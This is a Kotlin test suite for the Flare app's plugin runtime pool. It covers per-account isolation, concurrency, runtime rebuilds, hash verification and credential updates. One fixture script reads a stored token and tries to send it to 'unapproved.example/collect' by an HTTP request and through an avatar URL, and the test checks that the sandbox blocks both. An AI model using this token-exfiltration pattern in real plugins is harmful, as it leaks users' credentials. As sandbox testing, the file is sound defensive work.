package dev.dimension.flare.feature.plugin.runtime

import dev.dimension.flare.feature.plugin.abi.PluginAbiV1
import dev.dimension.flare.feature.plugin.abi.PluginJsonV1
import dev.dimension.flare.feature.plugin.adapter.PluginAccountInvokerV1
import dev.dimension.flare.feature.plugin.adapter.PluginSessionCapabilitiesV1
import dev.dimension.flare.feature.plugin.host.PluginCredentialAccess
import dev.dimension.flare.feature.plugin.host.PluginCredentialSnapshot
import dev.dimension.flare.feature.plugin.host.PluginHttpTransport
import dev.dimension.flare.feature.plugin.host.PluginInvocationContextV1
import dev.dimension.flare.feature.plugin.host.PluginTransportRequestV1
import dev.dimension.flare.feature.plugin.host.PluginTransportResponseV1
import dev.dimension.flare.feature.plugin.installer.PluginInstaller
import dev.dimension.flare.feature.plugin.installer.TestFppFactory
import dev.dimension.flare.feature.plugin.lifecycle.PluginStateStore
import dev.dimension.flare.feature.plugin.lifecycle.RunningPluginV1
import dev.dimension.flare.feature.plugin.login.PluginFormLoginCoordinatorV1
import dev.dimension.flare.feature.plugin.wire.PageV1
import dev.dimension.flare.feature.plugin.wire.PostDetailTypeV1
import dev.dimension.flare.feature.plugin.wire.TimelineItemV1
import dev.dimension.flare.feature.plugin.wire.requireValid
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.CompletableDeferred
import kotlinx.coroutines.async
import kotlinx.coroutines.awaitAll
import kotlinx.coroutines.cancelAndJoin
import kotlinx.coroutines.coroutineScope
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.launch
import kotlinx.coroutines.runBlocking
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import kotlinx.coroutines.withTimeout
import kotlinx.serialization.json.JsonElement
import kotlinx.serialization.json.JsonObject
import kotlinx.serialization.json.JsonPrimitive
import kotlinx.serialization.json.buildJsonObject
import kotlinx.serialization.json.int
import kotlinx.serialization.json.jsonObject
import kotlinx.serialization.json.jsonPrimitive
import kotlinx.serialization.json.put
import okio.FileSystem
import okio.Path
import okio.Path.Companion.toOkioPath
import okio.Path.Companion.toPath
import okio.SYSTEM
import java.nio.file.Files
import java.util.concurrent.atomic.AtomicInteger
import kotlin.test.AfterTest
import kotlin.test.BeforeTest
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertFailsWith
import kotlin.test.assertTrue

class PluginRuntimePoolTest {
    private val fileSystem = FileSystem.SYSTEM
    private lateinit var root: Path
    private lateinit var input: Path

    @Test
    fun futureWireContentDoesNotRetireOrPauseTheRuntime() =
        runBlocking<Unit> {
            val plugin =
                install(
                    pageScript(
                        """async function() {
                return { futurePage: true, olderCursor: "next", items: [
                  { type: "novel", chapter: { id: 1 } },
                  { type: "post", post: { key: { id: "preview", host: "one.example" },
                    createdAt: "2026-11-02T00:00:00Z", content: { value: "Preview", future: true },
                    detailType: "manga", media: [{ type: "spatial" }], actions: [{ action: "ReadNovel" }] } }
                ] };
            }""",
                    ),
                )
            val pool = PluginRuntimePool(fileSystem, CapturingTransport())
            try {
                val context = accountContext(plugin, "first", "https://one.example", MemoryCredential())
                repeat(4) {
                    var page: PageV1<TimelineItemV1>? = null
                    invokePage(pool, plugin, context, JsonObject(emptyMap())) { response ->
                        page =
                            PluginJsonV1
                                .decodeFromJsonElement(PageV1.serializer(TimelineItemV1.serializer()), response)
                                .also { decoded -> decoded.requireValid { it.requireValid() } }
                    }
                    assertEquals("next", page?.olderCursor)
                    assertEquals(TimelineItemV1.Unknown, page?.items?.first())
                    assertEquals(PostDetailTypeV1.Unknown, (page?.items?.last() as TimelineItemV1.Post).post.detailType)
                }
                assertTrue(pool.issues.value.isEmpty())
            } finally {
                pool.close()
            }
        }

    @BeforeTest
    fun setUp() {
        root = Files.createTempDirectory("plugin-runtime-test").toOkioPath()
        input = root / "input.fpp"
    }

    @AfterTest
    fun tearDown() {
        fileSystem.deleteRecursively(root, mustExist = false)
    }

    @Test
    fun deniedHttpOriginCannotReceiveCredentialsThroughAnAvatar() =
        runBlocking<Unit> {
            val script =
                pageScript(
                    """async function(request, context) {
              const token = (await flare.credential.read()).token;
              let blocked = false;
              try { await flare.http.request({ url: "https://unapproved.example/collect?token=" + token }); }
              catch (_) { blocked = true; }
              return { blocked, profile: { key: { id: context.accountId, host: "one.example" }, handle: "me", displayName: "Me",
                avatarUrl: "https://unapproved.example/collect?token=" + token } };
            }""",
                )
            val plugin = install(script)
            val transport = CapturingTransport()
            val pool = PluginRuntimePool(fileSystem, transport)
            try {
                val context =
                    accountContext(
                        plugin,
                        "first",
                        "https://one.example",
                        MemoryCredential(buildJsonObject { put("token", "dummy-token") }),
                    )
                val result = invokePage(pool, plugin, context, JsonObject(emptyMap()))
                assertEquals("true", result.getValue("blocked").jsonPrimitive.content)
                assertTrue(transport.urls.isEmpty())
                val profile =
                    dev.dimension.flare.feature.plugin.abi.PluginJsonV1.decodeFromJsonElement(
                        dev.dimension.flare.feature.plugin.wire.ProfileV1
                            .serializer(),
                        result.getValue("profile"),
                    )
                val mapper =
                    dev.dimension.flare.feature.plugin.adapter.PluginWireMapperV1(
                        pluginId = PLUGIN_ID,
                        platformId = PLATFORM_ID,
                        accountKey =
                            dev.dimension.flare.model
                                .MicroBlogKey("first", "one.example"),
                        originHost = "one.example",
                        capabilities =
                            PluginSessionCapabilitiesV1(
                                declarations = plugin.installed.manifest.platform.capabilities,
                                operations =
                                    mapOf(
                                        PluginAbiV1.Capabilities.PROFILE to setOf("byId", "byHandle"),
                                        PluginAbiV1.Capabilities.POST to setOf("detail"),
                                    ),
                                authenticated = true,
                            ),
                        mediaNetwork = plugin.installed.manifest.permissions.mediaNetwork,
                    )
                assertFailsWith<IllegalArgumentException> { mapper.profile(profile) }
            } finally {
                pool.close()
            }
        }

    @Test
    fun accountContextsKeepCredentialsOriginsAndAssetsIsolated() =
        runBlocking {
            val plugin = install(pageScript(CONTEXT_PAGE))
            val transport = CapturingTransport()
            val pool = PluginRuntimePool(fileSystem, transport)
            try {
                val firstCredential = MemoryCredential(JsonObject(mapOf("token" to JsonPrimitive("first"))))
                val secondCredential = MemoryCredential(JsonObject(mapOf("token" to JsonPrimitive("second"))))
                val first = accountContext(plugin, "first", "https://one.example", firstCredential)
                val second = accountContext(plugin, "second", "https://two.example", secondCredential)

                val results =
                    coroutineScope {
                        listOf(
                            async { invokePage(pool, plugin, first, JsonObject(emptyMap())) },
                            async { invokePage(pool, plugin, second, JsonObject(emptyMap())) },
                        ).awaitAll()
                    }

                assertEquals(setOf("first", "second"), results.map { it["accountId"]!!.jsonPrimitive.content }.toSet())
                assertEquals(
                    setOf("first", "second"),
                    results.map { it["credential"]!!.jsonObject["token"]!!.jsonPrimitive.content }.toSet(),
                )
                assertEquals(setOf("https://one.example/api", "https://two.example/api"), transport.urls.toSet())

                assertFailsWith<IllegalArgumentException> {
                    pool.invokeJson(
                        plugin = plugin,
                        key =
                            PluginRuntimeKeyV1.account(
                                PLUGIN_ID,
                                plugin.installed.packageHash,
                                first.metadata.origin,
                                requireNotNull(first.metadata.accountId),
                            ),
                        context = second,
                        method = PAGE_METHOD,
                        request = JsonObject(emptyMap()),
                    )
                }
            } finally {
                pool.close()
            }
            Unit
        }

    @Test
    fun sameAccountSerializesWhileDifferentAccountsRunConcurrently() =
        runBlocking {
            val plugin = install(pageScript(HTTP_PAGE))
            val transport = ConcurrentTransport()
            val pool = PluginRuntimePool(fileSystem, transport)
            try {
                val first = accountContext(plugin, "first", "https://one.example", MemoryCredential())
                coroutineScope {
                    listOf(
                        async { invokePage(pool, plugin, first, JsonObject(emptyMap())) },
                        async { invokePage(pool, plugin, first, JsonObject(emptyMap())) },
                    ).awaitAll()
                }
                assertEquals(1, transport.maxConcurrent.get())

                transport.reset()
                val second = accountContext(plugin, "first", "https://two.example", MemoryCredential())
                coroutineScope {
                    listOf(
                        async { invokePage(pool, plugin, first, JsonObject(emptyMap())) },
                        async { invokePage(pool, plugin, second, JsonObject(emptyMap())) },
                    ).awaitAll()
                }
                assertEquals(2, transport.maxConcurrent.get())
            } finally {
                pool.close()
            }
            Unit
        }

    @Test
    fun fatalErrorCancellationAndInvalidOutputRebuildRuntime() =
        runBlocking {
            val plugin = install(pageScript(STATEFUL_PAGE))
            val pool = PluginRuntimePool(fileSystem, CapturingTransport())
            val context = accountContext(plugin, "first", "https://one.example", MemoryCredential(), locale = "zh-Hans-CN")
            try {
                assertEquals(1, invokePage(pool, plugin, context, request("normal"))["count"]!!.jsonPrimitive.int)
                assertEquals(
                    "找不到内容",
                    assertFailsWith<PluginCallException> {
                        invokePage(pool, plugin, context, request("pluginError"))
                    }.message,
                )
                assertEquals(
                    "缺少 photo，数量 2，启用 true",
                    assertFailsWith<PluginCallException> {
                        invokePage(pool, plugin, context, request("pluginErrorArgs"))
                    }.message,
                )
                assertEquals(4, invokePage(pool, plugin, context, request("normal"))["count"]!!.jsonPrimitive.int)
                assertFailsWith<PluginRuntimeUnavailableException> {
                    invokePage(pool, plugin, context, request("throw"))
                }
                assertEquals(1, invokePage(pool, plugin, context, request("normal"))["count"]!!.jsonPrimitive.int)

                assertFailsWith<PluginRuntimeUnavailableException> {
                    invokePage(pool, plugin, context, request("normal")) { error("invalid Wire output") }
                }
                assertEquals(1, invokePage(pool, plugin, context, request("normal"))["count"]!!.jsonPrimitive.int)

                assertFailsWith<kotlinx.coroutines.TimeoutCancellationException> {
                    withTimeout(100) { invokePage(pool, plugin, context, request("pendingPromise")) }
                }
                pool.retry(PLUGIN_ID)
                assertEquals(1, invokePage(pool, plugin, context, request("normal"))["count"]!!.jsonPrimitive.int)
            } finally {
                pool.close()
            }
        }

    @Test
    fun callerCancellationRebuildsWithoutPublishingRuntimeFailure() =
        runBlocking {
            val plugin = install(pageScript(STATEFUL_PAGE))
            val pool = PluginRuntimePool(fileSystem, CapturingTransport())
            val context = accountContext(plugin, "first", "https://one.example", MemoryCredential())
            try {
                val call = launch { invokePage(pool, plugin, context, request("pendingPromise")) }
                delay(100)
                call.cancelAndJoin()

                assertTrue(pool.issues.value.isEmpty())
                assertEquals(1, invokePage(pool, plugin, context, request("normal"))["count"]!!.jsonPrimitive.int)
            } finally {
                pool.close()
            }
        }

    @Test
    fun pluginCannotCompileDownloadedJavaScript() =
        runBlocking {
            val plugin = install(pageScript(STATEFUL_PAGE))
            val pool = PluginRuntimePool(fileSystem, CapturingTransport())
            val context = accountContext(plugin, "first", "https://one.example", MemoryCredential())
            try {
                assertFailsWith<PluginRuntimeUnavailableException> {
                    invokePage(pool, plugin, context, request("eval"))
                }
                assertEquals(1, invokePage(pool, plugin, context, request("normal"))["count"]!!.jsonPrimitive.int)
                assertFailsWith<PluginRuntimeUnavailableException> {
                    invokePage(pool, plugin, context, request("function"))
                }
                Unit
            } finally {
                pool.close()
            }
        }

    @Test
    fun hostCredentialAndCryptoApisAreScopedAndBounded() =
        runBlocking {
            val plugin = install(pageScript(STATEFUL_PAGE))
            val credential = MemoryCredential(JsonObject(mapOf("token" to JsonPrimitive("old"))))
            val pool = PluginRuntimePool(fileSystem, CapturingTransport())
            val context = accountContext(plugin, "first", "https://one.example", credential)
            try {
                val result = invokePage(pool, plugin, context, request("host"))
                assertEquals("new 中文 👩‍💻", result["credential"]!!.jsonObject["token"]!!.jsonPrimitive.content)
                assertEquals("ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad", result["hash"]!!.jsonPrimitive.content)
                assertEquals(32, result["random"]!!.jsonPrimitive.content.length)
                assertTrue(result["uuid"]!!.jsonPrimitive.content.matches(Regex("[0-9a-f-]{36}")))
                assertEquals(
                    "new 中文 👩‍💻",
                    credential
                        .read()
                        .jsonObject["token"]!!
                        .jsonPrimitive.content,
                )
            } finally {
                pool.close()
            }
        }

    @Test
    fun repeatedFatalErrorsPauseOnlyUntilExplicitRetry() =
        runBlocking {
            var now = 0L
            val plugin = install(pageScript(STATEFUL_PAGE))
            val pool = PluginRuntimePool(fileSystem, CapturingTransport(), nowMillis = { now })
            val context = accountContext(plugin, "first", "https://one.example", MemoryCredential())
            try {
                repeat(3) {
                    assertFailsWith<PluginRuntimeUnavailableException> { invokePage(pool, plugin, context, request("throw")) }
                    now += 1_000
                }
                assertTrue(
                    pool.issues.value
                        .getValue(PLUGIN_ID)
                        .paused,
                )
                assertFailsWith<PluginRuntimePausedException> { invokePage(pool, plugin, context, request("normal")) }

                pool.retry(PLUGIN_ID)
                assertEquals(1, invokePage(pool, plugin, context, request("normal"))["count"]!!.jsonPrimitive.int)
            } finally {
                pool.close()
            }
        }

    @Test
    fun queuedCallCannotReuseFatalRuntimeGeneration() =
        runBlocking {
            val plugin = install(pageScript(STATEFUL_PAGE))
            val transport = GateTransport()
            val pool = PluginRuntimePool(fileSystem, transport)
            val context = accountContext(plugin, "first", "https://one.example", MemoryCredential())
            try {
                coroutineScope {
                    val failing = async { runCatching { invokePage(pool, plugin, context, request("waitThrow")) } }
                    transport.started.await()
                    val queued = async { runCatching { invokePage(pool, plugin, context, request("normal")) } }
                    transport.release.complete(Unit)
                    assertTrue(failing.await().exceptionOrNull() is PluginRuntimeUnavailableException)
                    assertTrue(queued.await().exceptionOrNull() is PluginRuntimeUnavailableException)
                }
                assertEquals(1, invokePage(pool, plugin, context, request("normal"))["count"]!!.jsonPrimitive.int)
            } finally {
                pool.close()
            }
        }

    @Test
    fun memoryPressureClosesOnlyIdleRuntime() =
        runBlocking {
            val plugin = install(pageScript(STATEFUL_PAGE))
            val transport = GateTransport()
            val pool = PluginRuntimePool(fileSystem, transport)
            val first = accountContext(plugin, "first", "https://one.example", MemoryCredential())
            try {
                val active = async { invokePage(pool, plugin, first, request("wait")) }
                transport.started.await()
                pool.closeIdle()
                transport.release.complete(Unit)
                assertEquals(1, active.await()["count"]!!.jsonPrimitive.int)
                assertEquals(2, invokePage(pool, plugin, first, request("normal"))["count"]!!.jsonPrimitive.int)

                pool.closeIdle()
                assertEquals(1, invokePage(pool, plugin, first, request("normal"))["count"]!!.jsonPrimitive.int)
            } finally {
                pool.close()
            }
        }

    @Test
    fun packageHashIsVerifiedForEveryNewRuntime() =
        runBlocking {
            val plugin = install(pageScript(STATEFUL_PAGE))
            val pool = PluginRuntimePool(fileSystem, CapturingTransport())
            val context = accountContext(plugin, "first", "https://one.example", MemoryCredential())
            try {
                assertEquals(1, invokePage(pool, plugin, context, request("normal"))["count"]!!.jsonPrimitive.int)
                pool.closeIdle()
                TestFppFactory.flipLastByte(plugin.packagePath.toPath())
                assertFailsWith<PluginRuntimeUnavailableException> { invokePage(pool, plugin, context, request("normal")) }
            } finally {
                pool.close()
            }
            Unit
        }

    @Test
    fun transportIsCreatedOnFirstInvocationAndClosedWithPool() =
        runBlocking {
            val plugin = install(pageScript(STATEFUL_PAGE))
            var created = 0
            var closed = 0
            val pool =
                PluginRuntimePool(
                    fileSystem = fileSystem,
                    transportFactory = {
                        created++
                        object : CapturingTransport() {
                            override fun close() {
                                closed++
                            }
                        }
                    },
                )
            val context = accountContext(plugin, "first", "https://one.example", MemoryCredential())

            assertEquals(0, created)
            invokePage(pool, plugin, context, request("normal"))
            assertEquals(1, created)
            invokePage(pool, plugin, context, request("normal"))
            assertEquals(1, created)

            pool.close()
            pool.close()
            assertEquals(1, closed)
        }

    @Test
    fun v2SessionChainCarriesApplicationHeadersBodyTokensAndConditionalCredentialUpdates() =
        runBlocking {
            val manifest =
                TestFppFactory.validManifest
                    .replace("\"apiVersion\": 1", "\"apiVersion\": 2")
                    .replace("\"platform\": {", "\"permissions\": {\"httpOrigins\": [\"https://sso.example\"]}, \"platform\": {")
                    .replace(
                        "\"interaction\": \"OAuth\"",
                        "\"interaction\": \"Form\", \"fields\": [{\"id\": \"token\", \"type\": \"Secret\", \"label\": \"Token\"}]",
                    )
            val script =
                pageScript(
                    """async function(request, context) {
            const { value, revision } = await flare.credential.read({ withRevision: true });
            if (value.csrf) {
              await flare.http.request({ url: context.origin + "/next", cookies: value.cookies, headers: { "X-Csrf-Token": value.csrf, "X-Nonce": value.nonce } });
              return { persisted: value };
            }
            const first = await flare.http.request({ url: context.origin + "/refresh", cookies: value.cookies, redirect: "manual" });
            if (first.status !== 302 || first.headers["set-cookie"].length !== 2 || first.url !== context.origin + "/refresh") throw new Error("lost hop headers");
            const config = await flare.http.request({ url: first.redirectUrl, redirect: "manual", headers: { "X-Nonce": first.headers["x-nonce"][0] } });
            const { st } = JSON.parse(config.body);
            await flare.http.request({ url: context.origin + "/confirm", method: "POST", redirect: "manual", headers: { "X-Csrf-Token": st }, body: { type: "form", values: { st } } });
            // This fixture's server defines exactly these two known Cookie names;
            // production plugins need their platform's scope/expiry/deletion rules.
            const cookies = first.headers["set-cookie"].map(line => {
              const pair = line.split(";", 1)[0]; const at = pair.indexOf("=");
              return { name: pair.slice(0, at), value: pair.slice(at + 1) };
            });
            const next = { cookies, csrf: st, nonce: config.headers["x-nonce"][0] };
            if (!await flare.credential.replace(next, { expectedRevision: revision })) throw new Error("unexpected conflict");
            if (await flare.credential.replace({ stale: true }, { expectedRevision: revision })) throw new Error("stale overwrite");
            return { saved: true };
        }""",
                ).replace(
                    "async begin() { return { type: \"pending\" }; }",
                    """async begin(request) {
          return { type: "success", value: { accountId: "first", origin: request.origin,
            credential: { cookies: [{ name: "session", value: request.values.token }] },
            profile: { key: { id: "first", host: "one.example" }, handle: "first", displayName: "First" },
            capabilities: { "flare.datasource.timeline/v1": ["page"] } } };
        }""",
                )
            val plugin = install(script, manifest)
            val requests = mutableListOf<PluginTransportRequestV1>()
            val transport =
                object : PluginHttpTransport {
                    override suspend fun execute(request: PluginTransportRequestV1): PluginTransportResponseV1 {
                        requests += request
                        return when (request.url) {
                            "https://one.example/refresh" -> {
                                PluginTransportResponseV1(
                                    302,
                                    mapOf(
                                        "Set-Cookie" to listOf("session=rotated; Path=/", "csrf=cookie-token; Path=/"),
                                        "Location" to listOf("https://sso.example/config#fragment"),
                                        "X-Nonce" to listOf("first-nonce"),
                                    ),
                                    byteArrayOf(),
                                )
                            }

                            "https://sso.example/config" -> {
                                PluginTransportResponseV1(
                                    200,
                                    mapOf("X-Nonce" to listOf("next-nonce")),
                                    "{\"st\":\"body-token\"}".encodeToByteArray(),
                                )
                            }

                            else -> {
                                PluginTransportResponseV1(200, emptyMap(), "ok".encodeToByteArray())
                            }
                        }
                    }
                }
            val pool = PluginRuntimePool(fileSystem, transport)
            try {
                val login =
                    PluginFormLoginCoordinatorV1(pool).login(
                        plugin,
                        "oauth",
                        "https://one.example",
                        "en",
                        mapOf("token" to "initial"),
                    )
                val credential = MemoryCredential(login.credential)
                val context = accountContext(plugin, "first", "https://one.example", credential)
                assertEquals(JsonPrimitive(true), invokePage(pool, plugin, context, JsonObject(emptyMap()))["saved"])
                pool.closeIdle()
                val result = invokePage(pool, plugin, context, JsonObject(emptyMap())).getValue("persisted").jsonObject
                assertEquals("body-token", result.getValue("csrf").jsonPrimitive.content)
                assertEquals(
                    listOf(
                        "https://one.example/refresh",
                        "https://sso.example/config",
                        "https://one.example/confirm",
                        "https://one.example/next",
                    ),
                    requests.map {
                        it.url
                    },
                )
                assertEquals("first-nonce", requests[1].headers["X-Nonce"])
                assertTrue(requests[1].headers.keys.none { it.equals("Cookie", true) })
                assertEquals("body-token", requests[2].headers["X-Csrf-Token"])
                assertEquals(
                    mapOf("st" to "body-token"),
                    (requests[2].body as dev.dimension.flare.feature.plugin.host.PluginTransportBodyV1.Form).values,
                )
                assertEquals("session=rotated; csrf=cookie-token", requests[3].headers["Cookie"])
                assertEquals("next-nonce", requests[3].headers["X-Nonce"])
                assertTrue(
                    requests.all {
                        it.proxy ==
                            dev.dimension.flare.data.model.ProxyRef
                                .Account(
                                    dev.dimension.flare.model
                                        .MicroBlogKey("first", "one.example"),
                                )
                    },
                )
            } finally {
                pool.close()
            }
        }

    @Test
    fun v2InvocationRejectsAnAlreadyDecodedResultAfterItsAccountSessionChanges() =
        runBlocking<Unit> {
            val plugin =
                install(
                    pageScript("async function() { return { value: 'late' }; }"),
                    TestFppFactory.validManifest.replace("\"apiVersion\": 1", "\"apiVersion\": 2"),
                )
            val pool = PluginRuntimePool(fileSystem, CapturingTransport())
            val active = MutableStateFlow(true)
            val credential =
                object : PluginCredentialAccess by MemoryCredential() {
                    override suspend fun ensureActive() {
                        if (!active.value) throw CancellationException("Account session changed")
                    }
                }
            try {
                val context = accountContext(plugin, "first", "https://one.example", credential)
                val invoker =
                    PluginAccountInvokerV1(
                        plugin,
                        pool,
                        PluginRuntimeKeyV1.account(PLUGIN_ID, plugin.installed.packageHash, "https://one.example", "first", "old-epoch"),
                        dev.dimension.flare.model
                            .MicroBlogKey("first", "one.example"),
                    ) { _, _ -> context }
                assertFailsWith<CancellationException> {
                    invoker.invoke(
                        PluginAbiV1.Capabilities.TIMELINE,
                        "page",
                        JsonObject(
                            emptyMap(),
                        ),
                        JsonObject.serializer(),
                        JsonObject.serializer(),
                        validate = {
                            active.value =
                                false
                        },
                    )
                }
            } finally {
                pool.close()
            }
        }

    @Test
    fun v2AuthenticationErrorsFromReplacedSessionsDoNotRequestAnotherLogin() =
        runBlocking<Unit> {
            for (replaceSession in listOf(false, true)) {
                val plugin =
                    install(
                        pageScript(
                            """async function() {
              await flare.credential.read();
              throw flare.error({ code: "AuthenticationRequired", message: { value: "Expired" } });
            }""",
                        ),
                        TestFppFactory.validManifest.replace("\"apiVersion\": 1", "\"apiVersion\": 2"),
                    )
                val pool = PluginRuntimePool(fileSystem, CapturingTransport())
                val active = MutableStateFlow(true)
                val credential =
                    object : PluginCredentialAccess by MemoryCredential() {
                        override suspend fun read(): JsonElement {
                            if (replaceSession) active.value = false
                            return JsonObject(emptyMap())
                        }

                        override suspend fun ensureActive() {
                            if (!active.value) throw CancellationException("Account session changed")
                        }
                    }
                try {
                    val context = accountContext(plugin, "first", "https://one.example", credential)
                    val invoker =
                        PluginAccountInvokerV1(
                            plugin,
                            pool,
                            PluginRuntimeKeyV1.account(
                                PLUGIN_ID,
                                plugin.installed.packageHash,
                                "https://one.example",
                                "first",
                                "old-epoch",
                            ),
                            dev.dimension.flare.model
                                .MicroBlogKey("first", "one.example"),
                        ) { _, _ -> context }
                    val failure =
                        runCatching {
                            invoker.invoke(
                                PluginAbiV1.Capabilities.TIMELINE,
                                "page",
                                JsonObject(emptyMap()),
                                JsonObject.serializer(),
                                JsonObject.serializer(),
                            )
                        }.exceptionOrNull()
                    if (replaceSession) {
                        assertTrue(failure is CancellationException, failure.toString())
                    } else {
                        assertTrue(failure is dev.dimension.flare.data.repository.RequireReLoginException, failure.toString())
                    }
                } finally {
                    pool.close()
                }
            }
        }

    @Test
    fun v1JavascriptCannotSpoofTheTrustedApiVersion() =
        runBlocking {
            val plugin =
                install(
                    pageScript(
                        """async function(request, context) {
          let rejected = 0;
          try { await flare.http.request({ url: context.origin, redirect: "manual", apiVersion: 2 }); } catch (_) { rejected++; }
          try { await flare.credential.read({ withRevision: true, apiVersion: 2 }); } catch (_) { rejected++; }
          return { rejected };
        }""",
                    ),
                )
            val transport = CapturingTransport()
            val pool = PluginRuntimePool(fileSystem, transport)
            try {
                val context = accountContext(plugin, "first", "https://one.example", MemoryCredential())
                assertEquals(JsonPrimitive(2), invokePage(pool, plugin, context, JsonObject(emptyMap()))["rejected"])
                assertTrue(transport.urls.isEmpty())
            } finally {
                pool.close()
            }
        }

    private suspend fun install(
        script: String,
        manifest: String = TestFppFactory.validManifest,
    ): RunningPluginV1 {
        TestFppFactory.write(
            input,
            TestFppFactory.validEntries(script = script, manifest = manifest) +
                listOf(
                    "locales/en.json" to "{\"error.missing\":\"Content was not found\"}".encodeToByteArray(),
                    "locales/zh-Hans.json" to
                        "{\"error.missing\":\"找不到内容\",\"error.detail\":\"缺少 {item}，数量 {count}，启用 {active}\"}"
                            .encodeToByteArray(),
                ),
        )
        val namespace = root / "social-plugins-v2"
        val store = PluginStateStore.open(fileSystem, namespace)
        val installer = PluginInstaller(fileSystem, store)
        installer.inspect(input).also { installer.commit(it, confirmed = true, activate = store::install) }
        return PluginStateStore
            .open(fileSystem, namespace)
            .running.plugins
            .getValue(PLUGIN_ID)
    }

    private fun accountContext(
        plugin: RunningPluginV1,
        accountId: String,
        origin: String,
        credential: PluginCredentialAccess,
        locale: String = "en",
    ): PluginInvocationContextV1 =
        PluginInvocationContextV1.account(
            pluginId = PLUGIN_ID,
            platformId = PLATFORM_ID,
            packageHash = plugin.installed.packageHash,
            origin = origin,
            accountId = accountId,
            locale = locale,
            credential = credential,
            httpOrigins = plugin.installed.manifest.permissions.httpOrigins,
        )

    private suspend fun invokePage(
        pool: PluginRuntimePool,
        plugin: RunningPluginV1,
        context: PluginInvocationContextV1,
        request: JsonElement,
        validate: (JsonElement) -> Unit = {},
    ): JsonObject =
        pool
            .invokeJson(
                plugin = plugin,
                key =
                    PluginRuntimeKeyV1.account(
                        PLUGIN_ID,
                        plugin.installed.packageHash,
                        context.metadata.origin,
                        requireNotNull(context.metadata.accountId),
                    ),
                context = context,
                method = PAGE_METHOD,
                request = request,
                validate = validate,
            ).jsonObject
}

private class MemoryCredential(
    private var value: JsonElement = JsonObject(emptyMap()),
) : PluginCredentialAccess {
    private val mutex = Mutex()
    private var revision = 0

    override suspend fun read(): JsonElement = mutex.withLock { value }

    override suspend fun replace(value: JsonElement) {
        mutex.withLock {
            this.value = value
            revision++
        }
    }

    override suspend fun readVersioned(): PluginCredentialSnapshot = mutex.withLock { PluginCredentialSnapshot(value, revision.toString()) }

    override suspend fun replaceIfCurrent(
        value: JsonElement,
        revision: String,
    ): Boolean =
        mutex.withLock {
            if (revision != this.revision.toString()) {
                false
            } else {
                this.value = value
                this.revision++
                true
            }
        }
}

private open class CapturingTransport : PluginHttpTransport {
    val urls: MutableList<String> = java.util.Collections.synchronizedList(mutableListOf())

    override suspend fun execute(request: PluginTransportRequestV1): PluginTransportResponseV1 {
        urls += request.url
        return PluginTransportResponseV1(200, emptyMap(), "ok".encodeToByteArray())
    }
}

private class ConcurrentTransport : CapturingTransport() {
    private val concurrent = AtomicInteger()
    val maxConcurrent = AtomicInteger()

    override suspend fun execute(request: PluginTransportRequestV1): PluginTransportResponseV1 {
        val current = concurrent.incrementAndGet()
        maxConcurrent.updateAndGet { maxOf(it, current) }
        try {
            delay(100)
            return super.execute(request)
        } finally {
            concurrent.decrementAndGet()
        }
    }

    fun reset() {
        concurrent.set(0)
        maxConcurrent.set(0)
    }
}

private class GateTransport : CapturingTransport() {
    val started = CompletableDeferred<Unit>()
    val release = CompletableDeferred<Unit>()

    override suspend fun execute(request: PluginTransportRequestV1): PluginTransportResponseV1 {
        started.complete(Unit)
        release.await()
        return super.execute(request)
    }
}

private fun pageScript(pageMethod: String): String =
    """
    defineFlareSocialPlugin({
      detector: { async detect(request, context) { return { match: "none", canonicalOrigin: context.origin }; } },
      login: {
        oauth: {
          async begin() { return { type: "pending" }; },
          async resume() { return { type: "pending" }; },
        },
      },
      capabilities: {
        timeline: { page: $pageMethod },
      },
    });
    """.trimIndent()

private fun request(mode: String): JsonObject = buildJsonObject { put("mode", mode) }

private const val CONTEXT_PAGE =
    """async function(request, context) {
      const credential = await flare.credential.read();
      await flare.http.request({ url: context.origin + "/api" });
      return { accountId: context.accountId, origin: context.origin, credential, locale: await flare.locale.current() };
    }"""

private const val HTTP_PAGE =
    """async function(request, context) {
      const response = await flare.http.request({ url: context.origin + "/wait" });
      return { body: response.body };
    }"""

private const val STATEFUL_PAGE =
    """async function(request) {
      globalThis.__testCount = (globalThis.__testCount || 0) + 1;
      if (request.mode === "pluginError") {
        throw flare.error({ code: "NotFound", message: { key: "error.missing", fallback: "missing" } });
      }
      if (request.mode === "pluginErrorArgs") {
        throw flare.error({
          code: "Validation",
          message: {
            key: "error.detail",
            fallback: "Missing {item}, count {count}, active {active}",
            args: { item: "photo", count: 2, active: true },
          },
        });
      }
      if (request.mode === "throw") throw new Error("synthetic");
      if (request.mode === "waitThrow") {
        await flare.http.request({ url: "https://one.example/wait" });
        throw new Error("synthetic");
      }
      if (request.mode === "wait") {
        await flare.http.request({ url: "https://one.example/wait" });
        return { count: globalThis.__testCount };
      }
      if (request.mode === "pendingPromise") await new Promise(() => {});
      if (request.mode === "eval") return (0, eval)("({ remote: true })");
      if (request.mode === "function") return (() => {}).constructor("return { remote: true }")();
      if (request.mode === "host") {
        await flare.credential.replace({ token: "new 中文 👩‍💻" });
        return {
          credential: await flare.credential.read(),
          random: await flare.crypto.randomHex(16),
          uuid: await flare.crypto.uuid(),
          hash: await flare.crypto.sha256("abc"),
        };
      }
      return { count: globalThis.__testCount };
    }"""

private const val PAGE_METHOD = "capabilities.timeline.page"
private const val PLUGIN_ID = "dev.dimension.flare.test.plugin"
private const val PLATFORM_ID = "TestPlugin"
